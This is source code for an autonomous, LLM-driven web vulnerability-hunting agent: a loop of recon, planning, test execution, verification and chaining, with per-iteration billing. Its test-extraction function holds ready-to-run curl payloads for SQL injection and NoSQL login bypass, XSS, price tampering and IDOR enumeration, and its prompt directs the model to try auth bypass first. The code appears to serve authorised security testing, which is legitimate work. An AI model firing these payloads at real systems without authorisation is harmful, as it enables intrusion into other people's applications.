// Dark Matter — autonomous hunt agent loop.
//
// THIS is the "replace the elite hunter" engine. An elite hunter works in a
// tight iterative loop: observe → hypothesize → test → verify → chain → repeat.
// This module implements exactly that, with the Bedrock model as the brain
// and the per-hunt container as the hands.
//
//   1. RECON    — container tools (nmap, nuclei) + JS mining + target profile
//   2. PLAN     — Bedrock picks the highest-value next test from intel modules
//   3. EXECUTE  — run the test in the isolated container
//   4. VERIFY   — evidenceGate (no proof = no finding) + 4-step verifyPipeline
//   5. CHAIN    — beamSearchChains: escalate confirmed findings to max impact
//   6. REPEAT   — until mode budget, cost cap, or goal reached
//
// Every step is defensive: a failed tool/LLM call degrades to the next test,
// never kills the hunt. Cost guard stops runaway Bedrock spend.

import fs from 'node:fs';
import path from 'node:path';
import {
  spawnHuntContainer,
  teardownHuntContainer,
  execInHuntContainer,
  dockerAvailable,
} from './huntRunner.js';
import { HuntOrchestrator } from './orchestrator.js';

// Active orchestrators by huntId — so assessResult can report verified
// findings to the head even though it doesn't receive it as a parameter.
const orchestrators = new Map();

// FIX (19 Oct 2026, solver #6): Loop-driver mutex. Prevents duplicate
// runAutonomousHunt loops for the same hunt (e.g., backend auto-resume +
// watchdog resume script both firing). Duplicate drivers clobber each other's
// meta writes — this caused the pause-clobbering bug where state=paused was
// overwritten with state=running+pausedReason.
const activeLoops = new Set();

// FIX (19 Oct 2026, elite-gap): CROSS-PROCESS driver lock. activeLoops is a
// per-process Set, but the benchmark-watchdog spawns bench_resume.mjs as a
// SEPARATE node process that imports this module fresh — its own empty
// activeLoops lets it start a second driver for the same hunt. Two drivers
// then interleave: one's injected plans (e.g. chain-pursuit tests unshifted to
// the front) get stranded while the other executes its own stale plans.
// Observed live on h_bench_d69e5746: "Chain pursuit tests injected" fired,
// but the execution phase ran [SQLi, NoSQLi, price-medium] with zero
// chain-test execution events — impossible in a single driver invocation
// (unshift puts chain tests at plans[0..1], slice(0,3) must include them),
// and events.jsonl appends are synchronous so the order is trustworthy.
// The lock file <huntDir>/driver.lock { pid, startedAt, heartbeatAt } is the
// cross-process mutex every spawner goes through (backend reconciler,
// watchdog scripts, routes all funnel into runAutonomousHunt).
const DRIVER_LOCK_STALE_MS = 90 * 60 * 1000; // steal only if heartbeat older
const DRIVER_LOCK_BEAT_MS = 5 * 60 * 1000; // heartbeat tick while driving
function driverLockPath(huntId) {
  return path.join(huntDir(huntId), 'driver.lock');
}
function lockPidAlive(pid) {
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
}
// Returns { ok:true } when we hold the lock, { ok:false, reason } otherwise.
function tryAcquireDriverLock(huntId) {
  const lp = driverLockPath(huntId);
  const now = Date.now();
  const claim = { pid: process.pid, startedAt: new Date(now).toISOString(), heartbeatAt: now };
  const writeExclusive = () => {
    try {
      fs.writeFileSync(lp, JSON.stringify(claim), { flag: 'wx' });
      return true;
    } catch {
      return false; // someone else won the race
    }
  };
  let existing = null;
  try {
    existing = JSON.parse(fs.readFileSync(lp, 'utf8'));
  } catch {
    /* no lock file or corrupt — treat as free */
  }
  if (!existing || typeof existing !== 'object') {
    return writeExclusive() ? { ok: true } : { ok: false, reason: 'lost race for fresh lock' };
  }
  const alive = Number.isInteger(existing.pid) && lockPidAlive(existing.pid);
  const fresh = Number.isFinite(existing.heartbeatAt) && now - existing.heartbeatAt < DRIVER_LOCK_STALE_MS;
  if (alive && fresh) {
    return { ok: false, reason: `driver pid ${existing.pid} alive, heartbeat fresh` };
  }
  // Dead pid (crashed backend) or ancient heartbeat (wedged driver) — steal
  // it. Unlink + exclusive create closes the steal race: only one contender's
  // 'wx' write succeeds.
  try {
    fs.unlinkSync(lp);
  } catch {
    /* already gone */
  }
  return writeExclusive() ? { ok: true, stole: true } : { ok: false, reason: 'lost race stealing stale lock' };
}
function releaseDriverLock(huntId) {
  const lp = driverLockPath(huntId);
  try {
    const existing = JSON.parse(fs.readFileSync(lp, 'utf8'));
    if (existing && existing.pid === process.pid) fs.unlinkSync(lp);
  } catch {
    /* best-effort */
  }
}
function touchDriverLock(huntId) {
  const lp = driverLockPath(huntId);
  try {
    const existing = JSON.parse(fs.readFileSync(lp, 'utf8'));
    if (existing && existing.pid === process.pid) {
      fs.writeFileSync(lp, JSON.stringify({ ...existing, heartbeatAt: Date.now() }));
    }
  } catch {
    /* best-effort */
  }
}
// Read-only driver-activity probe (solver #458): true when a loop driver is
// genuinely driving this hunt — in THIS process (activeLoops) or in another
// process holding a driver.lock whose pid is alive AND whose heartbeat is
// fresh (same liveness rule tryAcquireDriverLock uses to refuse a steal).
// Never acquires, steals, or mutates anything.
export function isDriverActive(huntId) {
  if (activeLoops.has(huntId)) return true;
  try {
    const existing = JSON.parse(fs.readFileSync(driverLockPath(huntId), 'utf8'));
    if (!existing || typeof existing !== 'object') return false;
    const alive = Number.isInteger(existing.pid) && lockPidAlive(existing.pid);
    const fresh =
      Number.isFinite(existing.heartbeatAt) && Date.now() - existing.heartbeatAt < DRIVER_LOCK_STALE_MS;
    return alive && fresh;
  } catch {
    return false;
  }
}
export function getOrchestrator(huntId) {
  return orchestrators.get(huntId) || null;
}
import { chatWithAI, aiAvailable } from './llm.js';
import { generateHypotheses, formatHypothesesForPrompt, scoreInterestingness, buildAppModel, formatAppModelForPrompt } from './curiosity.js';
import { recordReasoning, formatReasoningForPrompt, formatLedgerForPrompt, getHypothesisLedger, getVerifiedPairs, normalizeHypothesis, getAllReasoning, buildFullHistoryLedger, searchRecall } from './reasoningMemory.js';
import { recordGlobalLearning, getRelevantMemories, formatGlobalMemoryForPrompt, inferTechnique, readAllGlobalMemories } from './globalMemory.js';
import { webSearch, searchCVE } from './webSearch.js';
import { runBrowserTask, crawlScript } from './browserAgent.js';
import { getHuntCost } from './costTracker.js';
import { appendHuntEvent, writeHuntMeta, readHuntMeta, readHuntEvents, readUsers, readTargetIntel, writeTargetIntel, huntDir } from './store.js';
import { episodeLedgerEnabled, retrieveEpisodes, formatRetrievalForPrompt, recordRuledOut, getRuledOutCounts, formatLessonsForPrompt, RETRY_BUDGET, recordFact } from './episodeStore.js';
import { proposePlaybook, formatPlaybookForPrompt } from './playbook.js';
import { ensurePlanTree, renderPlanTree, recordPlanOutcome } from './planTree.js';
import { summarizeToolOutput } from './toolOutput.js';
import { handleArtifactCommand, spillOutput } from './artifacts.js';
import { getBalanceUsd, deductCreditsUsd } from './billing/credits.js';

// Credit price per hunt iteration (USD), by hunt mode. The hunt auto-pauses
// with state 'out_of_credits' when the wallet can't cover the next iteration;
// topping up + Resume continues it. Admins (owner) are exempt.
const ITERATION_PRICE_USD = {
  normal: 0.1,
  medium: 0.15,
  high: 0.25,
  ultra_high: 0.4,
  max: 0.6,
  infinity: 1.0,
};

/** Price of one hunt iteration, in integer USD cents. */
export function iterationPriceCents(mode) {
  return Math.round((ITERATION_PRICE_USD[mode] || ITERATION_PRICE_USD.normal) * 100);
}

function isAdminUser(userId) {
  try {
    if (!userId) return false;
    const users = readUsers();
    const u = Object.values(users).find((x) => x && x.id === userId);
    return u && u.role === 'admin';
  } catch {
    return false;
  }
}

/** Deduct one iteration's price. Returns true if the hunt may proceed. */
function chargeIteration(huntId, userId, mode, iteration) {
  if (isAdminUser(userId)) return true; // owner testing is free
  const priceCents = Math.round((ITERATION_PRICE_USD[mode] || ITERATION_PRICE_USD.normal) * 100);
  if (getBalanceUsd(userId) * 100 < priceCents) {
    const m = readHuntMeta(huntId) || {};
    writeHuntMeta(huntId, { ...m, state: 'out_of_credits', paused: true });
    think(huntId, 'Out of credits — hunt paused. Top up your balance and press Resume to continue.');
    appendHuntEvent(huntId, { type: 'status', state: 'out_of_credits', iteration });
    return false;
  }
  deductCreditsUsd(userId, priceCents, { huntId, iteration, mode });
  return true;
}
import {
  generateLogicTests,
  evidenceGate,
  verifyPipeline,
  executionFailed,
  assessContentRelevance,
  extractLinkedAssetUrls,
  beamSearchChains,
  analyzeFindings,
  mineJsEndpoints,
  rankEndpoints,
  blModulesFor,
  classifyTarget,
  scoreWeirdness,
  isWorthInvestigating,
  recordHuntExperience,
  getPlaybook,
  encodePayload,
  ENCODERS,
  fingerprintWaf,
  classifyFinding,
  sweepSiblings,
  buildSweepProbe,
  backfillVerifiedClasses,
} from './hunt-intel/index.js';

// REMOVED (owner directive 15 Oct 2026): iteration budgets are gone.
// Hunts run unlimited until the user stops them or the wallet runs out.
// Money is the only limit. This constant is kept for reference only.
const MODE_ITERATIONS = null;

// FNV-1a 32-bit hash, hex-encoded. Used for lightweight prompt-audit records:
// it fingerprints a prompt section's exact content without storing the prompt.
// Dependency-free and deterministic.
function fnv1aHex(str = '') {
  let h = 0x811c9dc5;
  const s = String(str);
  for (let i = 0; i < s.length; i++) {
    h ^= s.charCodeAt(i);
    h = Math.imul(h, 0x01000193);
  }
  return (h >>> 0).toString(16).padStart(8, '0');
}

export function think(huntId, text) {
  // FULL-FIDELITY RECORD (solver #459, owner order: "total permanent
  // memory"): the event log stores the COMPLETE thought text. The old
  // slice(0, 2000) destroyed the record itself; any shortening for a
  // prompt or a screen happens at READ time, never at write time.
  appendHuntEvent(huntId, { type: 'thinking', text: String(text) });
  // HUMAN-LIKE: Listen to the model's curiosity. If it's wondering about
  // something specific, help it investigate (like a human assistant would).
  // This is not a checklist — it's following the model's natural curiosity.
  detectAndPursueIntent(huntId, String(text));
}

/**
 * Human-like intent detection: if the model's thinking shows curiosity about
 * something specific, trigger deeper recon on it. The model thinks freely;
 * the system helps investigate. Like working with a human freelancer.
 * 
 * SAFE: Only triggers RECON actions (information gathering), never exploits.
 * The model decides WHAT is interesting; the system helps find OUT more.
 */
function detectAndPursueIntent(huntId, thinkingText) {
  const lower = thinkingText.toLowerCase();
  
  // Only act on curiosity, not on every thinking event
  const isCurious = /i wonder|interesting|curious|what if|looks like|seems|might be|odd|strange|unusual|pursuing.*thread/i.test(thinkingText);
  if (!isCurious) return;
  
  // HUMAN-LIKE: The model is curious about something. Acknowledge and encourage
  // deeper exploration. We don't need to know exactly what — the curiosity
  // itself is the signal to dig deeper.
  appendHuntEvent(huntId, { 
    type: 'thinking', 
    text: 'Following curiosity: model finds something interesting — will explore more deeply on next iteration.' 
  });
  
  // Intent: wants to know more about endpoints
  if (/endpoint|url|path|route/i.test(thinkingText) && /more|hidden|other|find/i.test(thinkingText)) {
    appendHuntEvent(huntId, { 
      type: 'thinking', 
      text: 'Intent detected: wants deeper endpoint discovery — will mine JS bundles more thoroughly.' 
    });
  }
  
  // Intent: curious about technology stack
  if (/what.*tech|which.*tech|tech.*stack|built with|framework/i.test(thinkingText)) {
    appendHuntEvent(huntId, { 
      type: 'thinking', 
      text: 'Intent detected: curious about tech stack — will run deeper fingerprinting.' 
    });
  }
  
  // Intent: interested in forms (recon, not exploit)
  if (/form.*interesting|login.*form|curious.*form/i.test(thinkingText)) {
    appendHuntEvent(huntId, { 
      type: 'thinking', 
      text: 'Intent detected: interested in forms — will map all form fields and actions.' 
    });
  }
}

function finding(huntId, f) {
  appendHuntEvent(huntId, { type: 'finding', ...f });
  // BI-TEMPORAL FACTS (Job 6 stage 8): a validator-confirmed class is a
  // durable fact about the target — recorded by code, presence-level
  // only, superseding cleanly if the same class is ever reclassified.
  try {
    if (f && f.verified === true) {
      recordFact({ huntId, subject: 'vuln', predicate: f.type || f.class || 'unknown', object: 'verified' });
    }
  } catch { /* facts are best-effort */ }
  // DEAD-END REGISTRY (Job 6 stage 4): a validator rejection becomes a
  // code-composed lesson in the ruled_out registry, checked by code in
  // the plan filter. Only deterministic verdicts write lessons — never
  // the model's opinion, never a verification-free false.
  try {
    if (f && f.verified === false && f.verification) {
      const m = /\((\w+)[::]/.exec(String(f.verification));
      recordRuledOut({
        huntId,
        title: f.title || f.class || 'finding',
        family: m ? m[1] : 'validator',
        detail: f.verification,
        linkEpisode: true,
      });
    }
  } catch { /* registry is best-effort */ }
}

/**
 * FIX #21: Execute in container with auto-respawn.
 * If the container is missing (destroyed on pause, crashed, etc.),
 * respawn it automatically and retry the command once.
 */
async function execWithRespawn(huntId, target, mode, cmd, timeoutMs = 120000) {
  let result = await execInHuntContainer(huntId, cmd, timeoutMs);
  if (result.containerMissing) {
    think(huntId, 'Hunt container missing — respawning automatically.');
    try {
      const { container } = await spawnHuntContainer(huntId, target, { mode });
      appendHuntEvent(huntId, { type: 'status', state: 'container_respawned', container });
      // Retry the command once after respawn
      result = await execInHuntContainer(huntId, cmd, timeoutMs);
    } catch (err) {
      think(huntId, `Container respawn failed: ${err.message}`);
    }
  }
  return result;
}

function isStopped(huntId) {
  try {
    const meta = readHuntMeta(huntId);
    return meta && (meta.stopped === true || meta.state === 'stopped');
  } catch {
    return false;
  }
}

function isPaused(huntId) {
  try {
    const meta = readHuntMeta(huntId);
    if (!meta) return false;
    // Standard pause indicators
    if (meta.paused === true || meta.state === 'paused') return true;
    // DEFENSIVE (19 Oct 2026, solver #6): A pausedReason with state='running'
    // means a loop driver clobbered the pause (wrote state=running without
    // clearing pausedReason). Treat as paused — a pause is a pause.
    // This was observed live: hunt loop overwrote state=paused with
    // state=running+pausedReason=ai_no_reply, reviving a paused hunt.
    if (meta.pausedReason && meta.state !== 'finished' && meta.state !== 'stopped') return true;
    return false;
  } catch {
    return false;
  }
}

/** Operator pause: hold the loop here until resumed or stopped. */
async function waitWhilePaused(huntId) {
  let waited = 0;
  let announced = false;
  while (isPaused(huntId) && !isStopped(huntId)) {
    if (!announced) {
      think(huntId, 'Hunt paused by user — holding position.');
      announced = true;
    }
    await new Promise((r) => setTimeout(r, 5000));
    waited += 5;
  }
}

/** Infer what the app DOES from endpoints + HTML (problem #6). */
function inferAppPurpose(endpoints, html) {
  const text = [...(endpoints || []), String(html || '').slice(0, 5000)].join(' ').toLowerCase();
  const purposes = [
    ['ecommerce store', /cart|checkout|product|shop|order|payment/i],
    ['banking/fintech', /transfer|wallet|balance|iban|kyc|trading/i],
    ['social platform', /feed|post|follow|like|comment|profile/i],
    ['saas dashboard', /dashboard|workspace|subscription|billing|team/i],
    ['auth service', /login|signup|oauth|sso|2fa|password/i],
    ['file sharing', /upload|download|file|share|storage/i],
    ['cms/blog', /article|post|comment|category|tag/i],
    ['api gateway', /graphql|rest|webhook|api\/v/i],
  ];
  for (const [name, re] of purposes) {
    if (re.test(text)) return name;
  }
  return 'general web app';
}

/** Phase 1: recon inside the container. Returns {ports, endpoints, profile}. */
async function reconPhase(huntId, target) {
  think(huntId, 'I started mapping the attack surface — checking what this target exposes.');
  const host = target.replace(/^https?:\/\//, '').split('/')[0];
  const recon = { ports: [], endpoints: [], profile: 'generic' };

  // Port scan
  const nmap = await execInHuntContainer(huntId, `nmap -T4 --top-ports 200 ${host} 2>/dev/null | grep -E "^[0-9]+/tcp.*open" | head -20`);
  for (const line of nmap.stdout.split('\n').filter(Boolean)) {
    const m = /^(\d+)\/tcp\s+open\s+(\S+)/.exec(line.trim());
    if (m) {
      recon.ports.push({ port: m[1], service: m[2] });
      appendHuntEvent(huntId, { type: 'tool_call', tool: 'nmap', detail: `open ${m[1]}/${m[2]}` });
    }
  }

  // BROWSER EXPLORATION: use the site like a human would.
  // A human hunter doesn't just curl — they click, fill forms, observe.
  try {
    think(huntId, 'Exploring the site in a real browser like a human would.');
    const browserResult = await runBrowserTask(huntId, crawlScript(target), 45000);
    if (browserResult && browserResult.result) {
      const { forms, links } = browserResult.result;
      think(huntId, `Browser found ${forms.length} forms and ${links.length} links.`);
      // Add discovered endpoints from browser
      for (const link of links.slice(0, 20)) {
        if (link.startsWith(target) && !recon.endpoints.includes(link)) {
          recon.endpoints.push(link);
        }
      }
      // Record forms for later testing
      recon.forms = forms;
      appendHuntEvent(huntId, { type: 'tool_call', tool: 'browser', detail: `explored: ${forms.length} forms, ${links.length} links` });
    }
  } catch (err) {
    think(huntId, 'Browser exploration failed, continuing with standard recon.');
  }

  // Fetch homepage HTML for JS mining + profiling + TECH DETECTION
  // bypassTmux: tmux truncates to 50 lines; we need the full HTML body.
  const curl = await execInHuntContainer(
    huntId,
    `curl -skL --max-time 25 -A "Mozilla/5.0" -D /tmp/headers.txt "${target}" 2>/dev/null | head -c 200000; echo "---HEADERS---"; cat /tmp/headers.txt 2>/dev/null | head -30`,
    120000,
    { bypassTmux: true }
  );
  const html = curl.stdout || '';
  if (html) {
    const [bodyPart, headerPart] = html.split('---HEADERS---');
    const mined = mineJsEndpoints(bodyPart || html);
    // JS BUNDLE MINING: SPAs (Angular/React/Vue) keep API endpoints in JS
    // bundles, not HTML. Download local <script src> bundles and mine them.
    // Without this, the agent is blind to modern web apps.
    // NOTE: mining happens INSIDE the container via grep — the exec channel
    // (tmux) truncates large outputs, so we only return the matched lines.
    try {
      const scriptSrcs = [...(bodyPart || html).matchAll(/<script[^>]+src=["']([^"']+)["']/gi)]
        .map((m) => m[1])
        .filter((src) => !src.startsWith('http') && !src.startsWith('//'))
        .slice(0, 5);
      if (scriptSrcs.length) {
        think(huntId, `Mining ${scriptSrcs.length} JS bundles for hidden endpoints.`);
        const base = target.replace(/\/$/, '');
        for (const src of scriptSrcs) {
          const jsUrl = src.startsWith('/') ? base + src : base + '/' + src;
          try {
            const jsRes = await execInHuntContainer(
              huntId,
              `curl -skL --max-time 15 -A "Mozilla/5.0" "${jsUrl}" 2>/dev/null | grep -oE '"/(api|rest|v[0-9]+|admin|graphql|internal)[^"]*"' | head -30`,
            );
            const lines = (jsRes.stdout || '').split('\n').filter(Boolean);
            for (const line of lines) {
              const ep = line.replace(/"/g, '').trim();
              // FIX (19 Oct 2026, solver #6): Validate endpoint format.
              // Raw stdout includes Kali MOTD lines, shell prompts, and command
              // echoes — these were added as "endpoints" (e.g., the MOTD line
              // containing "hushlogin" matched the /login/ filter, corrupting
              // the mandatory SQLi test URL). Only accept actual path-like endpoints.
              if (!/^\/(api|rest|v\d+|admin|graphql|internal)(\/|$|[?#])/.test(ep)) continue;
              if (ep.length > 2 && ep.length < 200 && !mined.includes(ep)) mined.push(ep);
            }
          } catch { /* skip failed bundle */ }
        }
        think(huntId, `Bundle mining found ${mined.length} total endpoints.`);
      }
    } catch { /* bundle mining is best-effort */ }
    recon.endpoints = rankEndpoints(mined).slice(0, 30);
    recon.profile = classifyTarget(recon.endpoints);
    recon.purpose = inferAppPurpose(recon.endpoints, bodyPart || html);
    
    // INTELLIGENT TECH DETECTION — think first, then act
    try {
      const { detectTechnologies, getToolChain, buildIntelligentPrompt } = await import('./toolChains.js');
      const detection = detectTechnologies(headerPart || '', bodyPart || html);
      recon.detection = detection;
      recon.intelligentPrompt = buildIntelligentPrompt(detection, target, []);
      
      const techList = detection.techs.length ? detection.techs.join(', ') : 'unknown';
      const dbInfo = detection.database ? `Database: ${detection.database}` : 'No database detected';
      think(huntId, `I analyzed the target: [${techList}]. ${dbInfo}. I will only run appropriate tests.`);
      
      // Get intelligent tool chain based on detection
      const chain = getToolChain(detection, target);
      recon.toolChain = chain;
      think(huntId, `My attack plan has ${chain.length} targeted steps based on what I found.`);
      
      appendHuntEvent(huntId, {
        type: 'recon_intel',
        techs: detection.techs,
        database: detection.database,
        chainSteps: chain.length,
      });

      // FIX #40: Web search for CVEs on detected technologies.
      // Trigger only when we have concrete tech names to avoid noise.
      if (detection.techs && detection.techs.length > 0) {
        try {
          const topTech = detection.techs.slice(0, 2);
          think(huntId, `Searching for known vulnerabilities in: ${topTech.join(', ')}`);
          const cveResults = [];
          for (const tech of topTech) {
            const results = await searchCVE(tech, '');
            cveResults.push(...results.slice(0, 2));
          }
          if (cveResults.length > 0) {
            recon.cveIntel = cveResults;
            think(huntId, `Found ${cveResults.length} relevant CVE references.`);
            appendHuntEvent(huntId, {
              type: 'cve_intel',
              techs: topTech,
              results: cveResults.map(r => ({ title: r.title, url: r.url })),
            });
          }
        } catch (err) {
          // Web search is best-effort, never blocks the hunt
          console.error('[hunt] CVE search failed:', err.message);
        }
      }
    } catch (err) {
      console.error('[hunt] tech detection failed:', err.message);
    }
    
    think(huntId, `I mapped ${mined.length} endpoints. This looks like: ${recon.profile} (${recon.purpose}).`);
  }

  // Nuclei quick scan
  const nuclei = await execInHuntContainer(huntId, `nuclei -u "${target}" -silent -json 2>/dev/null | head -30`, 300000);
  for (const line of nuclei.stdout.split('\n').filter(Boolean)) {
    try {
      const nj = JSON.parse(line);
      const cand = {
        class: nj.info?.severity ? `nuclei_${nj['template-id'] || 'finding'}` : 'nuclei_finding',
        title: nj.info?.name || 'nuclei finding',
        severity: (nj.info?.severity || 'medium').toLowerCase(),
        url: nj['matched-at'] || target,
        evidence: { request: `nuclei ${nj['template-id']}`, response: line.slice(0, 500) },
      };
      // Gate EVERYTHING through evidence + verification — no raw scanner output ships
      const { pass, gated } = evidenceGate(cand);
      if (pass) {
        const v = verifyPipeline({ reachability: true, payload_validation: true, impact_assessment: true, exploit_confirmation: false });
        finding(huntId, { ...gated, verification: v.verdict });
      }
    } catch { /* skip malformed lines */ }
  }

  return recon;
}

/**
 * HUMAN-LIKE TEST EXTRACTION: When the model thinks like a human ("Test: ...",
 * "What if I...", "I wonder if...") instead of producing JSON, extract the
 * test INTENTIONS and construct executable commands.
 *
 * A human assistant hears the idea and figures out HOW to test it.
 * This is not a checklist — it's understanding intent and acting on it.
 */
function extractTestsFromThinking(reply, recon, target) {
  const tests = [];
  const baseUrl = target.replace(/\/$/, '');
  const endpoints = recon.endpoints || [];

  // Find login endpoints for auth tests
  const loginEp = endpoints.find((ep) => /login|auth|signin/i.test(ep)) || '/rest/user/login';
  // Find basket/cart endpoints for business logic tests
  const basketEp = endpoints.find((ep) => /basket|cart/i.test(ep)) || '/rest/basket';
  // Find product endpoints
  const productEp = endpoints.find((ep) => /product/i.test(ep)) || '/rest/products';

  const text = String(reply).toLowerCase();

  // Pattern 1: "Test: <name> — <description>"
  const testPattern = /test:\s*([^—\n]+?)(?:—|-)\s*([^\n]+)/gi;
  let m;
  while ((m = testPattern.exec(reply)) !== null && tests.length < 3) {
    const testName = m[1].trim();
    const description = m[2].trim();
    const lower = (testName + ' ' + description).toLowerCase();

    let command = null;
    let why = description.slice(0, 200);

    // SQLi on login
    if (/sql.*inject|login.*bypass|auth.*bypass/i.test(lower) && /login|auth/i.test(lower)) {
      command = `curl -sk -X POST "${baseUrl}${loginEp}" -H "Content-Type: application/json" -d '{"email":"admin@juice-sh.op'"'"' OR 1=1--","password":"x"}' | head -c 2000`;
    }
    // NoSQL injection
    else if (/nosql/i.test(lower)) {
      command = `curl -sk -X POST "${baseUrl}${loginEp}" -H "Content-Type: application/json" -d '{"email":{"$ne":null},"password":{"$ne":null}}' | head -c 2000`;
    }
    // XSS
    else if (/xss|cross.*site|script.*inject/i.test(lower)) {
      const searchEp = endpoints.find((ep) => /search/i.test(ep)) || '/rest/products/search';
      command = `curl -sk "${baseUrl}${searchEp}?q=<script>alert(1)</script>" | head -c 2000`;
    }
    // Price manipulation
    else if (/price.*manipulat|manipulat.*price|cost.*change/i.test(lower)) {
      command = `curl -sk "${baseUrl}${basketEp}" -d 'quantity=1' -d 'price=0.01' | head -c 2000`;
    }
    // Quantity manipulation
    else if (/quantit/i.test(lower)) {
      command = `curl -sk "${baseUrl}${basketEp}" -d 'quantity=0' | head -c 2000; echo "---NEG---"; curl -sk "${baseUrl}${basketEp}" -d 'quantity=-1' | head -c 2000`;
    }
    // IDOR / object ID
    else if (/idor|object.*id|someone.*else|other.*user/i.test(lower)) {
      command = `curl -sk "${baseUrl}${basketEp}/1" | head -c 2000; echo "---2---"; curl -sk "${baseUrl}${basketEp}/2" | head -c 2000`;
    }
    // Empty basket checkout
    else if (/empty.*basket|basket.*empty|checkout.*empty/i.test(lower)) {
      command = `curl -sk -X POST "${baseUrl}/rest/basket/checkout" -H "Content-Type: application/json" -d '{}' | head -c 2000`;
    }
    // Generic: try to construct a probe based on keywords
    else if (/product.*id|product/i.test(lower)) {
      command = `curl -sk "${baseUrl}${productEp}/1" | head -c 2000`;
    }

    if (command) {
      tests.push({ test: testName.slice(0, 100), command, why, hypothesis: `Testing: ${testName.slice(0, 100)}` });
    }
  }

  // Pattern 2: "What if I..." / "I wonder if..." — curiosity-driven tests
  const wonderPattern = /(?:what if|i wonder if|can i|is it possible to)\s+([^\n?.]+)/gi;
  while ((m = wonderPattern.exec(reply)) !== null && tests.length < 3) {
    const idea = m[1].trim();
    const lower = idea.toLowerCase();

    let command = null;
    if (/checkout.*empty|empty.*basket/i.test(lower)) {
      command = `curl -sk -X POST "${baseUrl}/rest/basket/checkout" -H "Content-Type: application/json" -d '{}' | head -c 2000`;
    } else if (/price|cheaper|free/i.test(lower)) {
      command = `curl -sk "${baseUrl}${basketEp}" | head -c 2000`;
    } else if (/other.*user|someone.*else|idor/i.test(lower)) {
      command = `curl -sk "${baseUrl}${basketEp}/1" | head -c 1000; echo "---"; curl -sk "${baseUrl}${basketEp}/999" | head -c 1000`;
    }

    if (command) {
      tests.push({
        test: `Curiosity: ${idea.slice(0, 80)}`,
        command,
        why: `Model wondered: "${idea.slice(0, 150)}"`,
        hypothesis: 'Curiosity-driven probe',
      });
    }
  }

  return tests;
}

/** Phase 2+: Bedrock picks the next test; we execute and verify. */
async function agentIteration(huntId, target, recon, findings, iteration, playbook) {
  const confirmed = findings.filter((f) => f.verified);

  // MID-HUNT STEERING: the user can talk to the brain from the frontend.
  // Drain any queued instructions and follow them this iteration.
  let steering = '';
  try {
    const m = readHuntMeta(huntId) || {};
    const queue = Array.isArray(m.steerQueue) ? m.steerQueue : [];
    if (queue.length) {
      steering = queue.map((q) => `- ${q.from}: ${q.message}`).join('\n');
      think(huntId, `Received your instruction — following it this round: ${queue[queue.length - 1].message.slice(0, 120)}`);
      writeHuntMeta(huntId, { ...m, huntId, steerQueue: [] });
    }
  } catch { /* steering must never break the hunt */ }

  // Playbook: what worked on similar targets before?
  const lessons = (playbook || []).slice(0, 3).map((l) => `- ${l.technique}: ${l.why}`).join('\n');

  // CURIOSITY ENGINE: generate hypotheses from recent observations.
  // A human hacker follows interesting threads, not just a checklist.
  let curiositySection = '';
  try {
    const recentEvents = readHuntEvents(huntId).slice(-20);
    const observations = recentEvents
      .filter((e) => e.type === 'tool_call' || e.type === 'thinking')
      .map((e) => ({ output: e.output || e.text || '', duration: e.duration }));
    const hypotheses = generateHypotheses(observations, recon);
    curiositySection = formatHypothesesForPrompt(hypotheses);
    if (curiositySection) {
      think(huntId, `Curiosity: pursuing ${hypotheses.length} interesting threads`);
    }
  } catch { /* curiosity must never break the hunt */ }

  // CONTEXT BUDGETING: the prompt must fit inside the model's real context
  // window (OLLAMA_NUM_CTX — 2048 on the 7GB EC2 box, lowered 16 Oct 2026 to
  // stop OOM kills). A prompt longer than num_ctx makes Ollama return
  // HTTP 500, which the hunt reads as "model gave no reply" and eventually
  // pauses with ai_no_reply. So the budget is derived from the actual
  // num_ctx minus the output budget, not from a hardcoded assumption.
  // Priority: target intelligence > confirmed findings > lessons > endpoints.
  const NUM_CTX = parseInt(process.env.OLLAMA_NUM_CTX || '2048', 10);
  const NUM_PREDICT = parseInt(process.env.OLLAMA_NUM_PREDICT || '600', 10);
  // ~3.5 chars per token (conservative for URLs/JSON/code); reserve the
  // output budget plus a 200-token safety margin.
  const MAX_PROMPT_CHARS = Math.max(2000, Math.floor((NUM_CTX - NUM_PREDICT - 200) * 3.5));
  const MAX_INTEL_CHARS = Math.max(500, Math.floor(MAX_PROMPT_CHARS / 5));
  const intel = recon.intelligentPrompt
    ? `\n--- TARGET INTELLIGENCE (follow strictly) ---\n${String(recon.intelligentPrompt).slice(0, MAX_INTEL_CHARS)}`
    : '';
  // HIGH-VALUE TARGETS: authentication endpoints are the #1 priority for
  // elite hunters. If the recon found login/auth endpoints, flag them
  // explicitly — the model often overlooks them among generic endpoints.
  const authEndpoints = (recon.endpoints || []).filter((ep) =>
    /login|auth|signin|session|token/i.test(ep)
  );
  const authHint = authEndpoints.length
    ? `\nHIGH-VALUE TARGETS (test FIRST): ${authEndpoints.slice(0, 5).join(', ')} — these are authentication endpoints. Try SQL injection, NoSQL injection, and authentication bypass on them before anything else.`
    : '';
  const context = [
    `Target: ${target}`,
    `Profile: ${recon.profile}`,
    `Open ports: ${(recon.ports || []).map((p) => `${p.port}/${p.service}`).join(', ') || 'none found'}`,
    `Endpoints: ${recon.endpoints.slice(0, 15).join(', ') || 'none mined'}`,
    authHint,
    `Confirmed findings so far: ${confirmed.length}`,
    ...confirmed.slice(-5).map((f) => `- ${f.title} (${f.severity})`),
    lessons ? `Past lessons for similar targets:\n${lessons}` : '',
    // INTELLIGENT CONTEXT: tech detection tells AI what NOT to try
    // (e.g., never suggest SQLi on a MongoDB target)
    intel,
    // LONG-TERM MEMORY: what past hunts learned about THIS target
    recon.pastIntel && recon.pastIntel.huntCount > 0
      ? `\n--- MEMORY OF PAST HUNTS ON THIS TARGET (${recon.pastIntel.huntCount} hunts) ---\n` +
        `Past technologies: ${(recon.pastTechnologies || []).join(', ') || 'unknown'}\n` +
        `Past findings: ${(recon.pastIntel.findings || []).slice(-5).map((f) => `${f.title} (${f.severity})`).join('; ') || 'none'}\n` +
        `Do NOT repeat tests that already failed here — try new angles.`
      : '',
  ].join('\n').slice(0, MAX_PROMPT_CHARS);

  // HUMAN MENTAL MODEL: what does this app DO? A human hunter spends the first
  // 2 minutes understanding the app, not running scans. Build that model here.
  let appModelSection = '';
  // GLOBAL MEMORY (19 Oct 2026): the target's fingerprint (app type + tech
  // stack) is captured here so (a) the read path can fetch relevant
  // cross-hunt lessons for the prompt, and (b) the write path in
  // assessResult (which has no recon) can attribute findings via hunt meta.
  let appFingerprint = { appType: 'unknown', techStack: [] };
  try {
    const appModel = buildAppModel(recon.endpoints || [], recon.detection?.techs || [], recon.profile || '');
